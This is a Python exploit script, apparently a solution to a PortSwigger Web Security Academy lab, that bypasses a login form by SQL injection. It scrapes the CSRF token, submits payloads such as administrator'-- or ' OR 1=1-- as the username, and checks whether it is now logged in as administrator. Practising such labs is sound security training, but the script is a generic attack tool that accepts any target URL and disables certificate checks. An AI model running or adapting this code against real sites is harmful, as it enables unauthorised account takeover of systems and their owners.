#!/usr/bin/python3
# Title: SQL injection vulnerability allowing login bypass
# Description: https://portswigger.net/web-security/sql-injection
# Lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass
# Bypass login as administrator using payload administrator'--
# Example: python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--"

import requests
import sys
import urllib3
import argparse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection vulnerability allowing login bypass')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

def get_csrf_token(sess, url):
    r = sess.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    output.success("Csrf Token: %s" %csrf)
    return csrf

def exploit_sqli(sess, url, payload, proxies=None):
    csrf = get_csrf_token(sess,url)
    data = {"csrf": csrf,"username": payload, "password": "hahahaha"}
    r = sess.post(url,data=data,verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection exploitation tool")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com/login)")
    parser.add_argument("payload", help="SQL Injection payload (e.g., administrator'--)")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        output.info(f"Using proxy: {args.proxy}")

    sess = requests.Session()
    if exploit_sqli(sess, args.url.strip(), args.payload.strip(),proxies):
        output.success("SQL Injection successful!. We have logged as an Administrator!")
    else:
        output.error("SQL Injection unsuccessful!")